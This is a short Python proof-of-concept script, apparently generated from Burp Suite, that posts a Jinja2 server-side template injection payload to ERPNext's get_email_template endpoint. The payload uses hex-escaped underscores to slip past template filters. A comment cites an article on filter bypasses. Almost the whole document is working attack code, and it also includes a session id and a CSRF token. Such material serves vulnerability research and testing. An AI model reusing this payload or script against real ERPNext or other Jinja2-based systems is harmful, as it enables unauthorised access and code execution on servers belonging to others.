'''
{{ '' | attr('\x5f\x5fclass\x5f\x5f')}}
https://0day.work/jinja2-template-injection-filter-bypasses/
'''

import requests
burp0_url = "http://erpnext:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
burp0_cookies = {"user_id": "zeljka.k%40randomdomain.com", "user_image": "", "full_name": "Zeljka%20Kola%C5%A1inac", "sid": "a3da8ddc0ef4b82dbc41cdcfa842fe5dde6f7306c2523418dac0ce9d", "system_user": "yes"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "1cfc1b545ac656614e8d94d397c80a8543038d3fdd76d39bbca2bfd3", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
burp0_data = {"template_name": "ssti_t5", "doc": "{\"owner\":\"zeljka.k@randomdomain.com\",\"parentfield\":null,\"response\":\"<div>{{ '' | attr('\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f')}}</div>\",\"modified\":\"2022-11-07 18:46:19.284921\",\"parenttype\":null,\"name\":\"ssti_t5\",\"idx\":0,\"subject\":\"ssti_t5\",\"creation\":\"2022-11-07 18:46:19.284921\",\"docstatus\":0,\"parent\":null,\"doctype\":\"Email Template\",\"modified_by\":\"zeljka.k@randomdomain.com\",\"__last_sync_on\":\"2022-11-07T23:46:19.589Z\"}", "_lang": ''}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)